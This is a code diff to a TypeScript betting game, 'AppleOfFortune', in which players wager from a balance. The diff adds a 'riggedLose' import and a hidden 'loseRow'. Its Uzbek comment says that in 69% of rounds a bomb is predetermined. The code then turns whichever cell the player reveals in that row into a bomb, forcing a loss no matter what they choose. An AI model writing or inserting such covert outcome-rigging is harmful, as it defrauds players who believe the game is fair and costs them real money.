@@ -3,6 +3,7 @@ import { useLocation } from "wouter";
 import { ArrowLeft } from "lucide-react";
 import { usePlayer } from "@/lib/player-context";
 import { placeBet } from "@/lib/api";
+import { riggedLose } from "@/lib/odds";
 
 const ROWS = 10;
 const COLS = 5;
@@ -41,6 +42,8 @@ export default function AppleOfFortune() {
   const [cashOutAmount, setCashOutAmount] = useState(0);
   const [saving, setSaving] = useState(false);
   const [showResult, setShowResult] = useState(false);
+  // Uy foydasi: 69% raundda bomba oldindan belgilangan qatorda chiqadi
+  const [loseRow, setLoseRow] = useState<number>(-1);
 
   const activeBet = customBet ? Math.max(2000, Number(customBet)) : bet;
   const currentMult = activeRow > 0 ? MULTIPLIERS[activeRow - 1] : null;
@@ -61,6 +64,7 @@ export default function AppleOfFortune() {
     if (!player || player.balance < activeBet || activeBet < 2000) return;
     setGrid(generateGrid());
     setRevealed(Array.from({ length: ROWS }, () => Array(COLS).fill(false)));
+    setLoseRow(riggedLose() ? Math.floor(Math.random() * 3) : -1);
     setActiveRow(0); setCashOutAmount(0); setShowResult(false); setGameState("playing");
   };
 
@@ -70,7 +74,11 @@ export default function AppleOfFortune() {
     newRev[row][col] = true;
     setRevealed(newRev);
 
-    if (grid[row][col] === "bomb") {
+    const forcedBomb = row === loseRow;
+    if (forcedBomb) {
+      setGrid(g => g.map((r, ri) => ri === row ? r.map((c, ci) => ci === col ? "bomb" : c) : r));
+    }
+    if (forcedBomb || grid[row][col] === "bomb") {
       setTimeout(() => {
         setRevealed(newRev.map((r, ri) => ri <= row ? Array(COLS).fill(true) : r));
         setGameState("lost");
